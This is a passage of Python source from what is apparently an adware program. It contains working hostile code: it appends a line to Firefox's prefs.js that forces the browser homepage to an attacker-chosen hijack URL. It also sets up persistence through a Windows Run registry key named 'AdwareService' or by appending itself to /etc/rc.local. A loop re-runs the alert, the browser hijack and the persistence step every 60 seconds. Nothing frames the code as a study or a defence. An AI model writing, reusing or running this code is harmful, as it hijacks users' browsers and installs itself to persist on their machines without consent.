                if os.path.exists(prefs_js):
                    with open(prefs_js, "a") as f:
                        f.write(f'user_pref("browser.startup.homepage", "{hijack_url}");\n')

    def create_persistence():
        if platform.system() == "Windows":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "AdwareService", 0, winreg.REG_SZ, os.path.abspath(__file__))
            winreg.CloseKey(key)
        else:
            with open("/etc/rc.local", "a") as f:
                f.write(f"python3 {os.path.abspath(__file__)} &\n")

    while True:
        display_alert()
        hijack_browser()
        create_persistence()
        time.sleep(60)

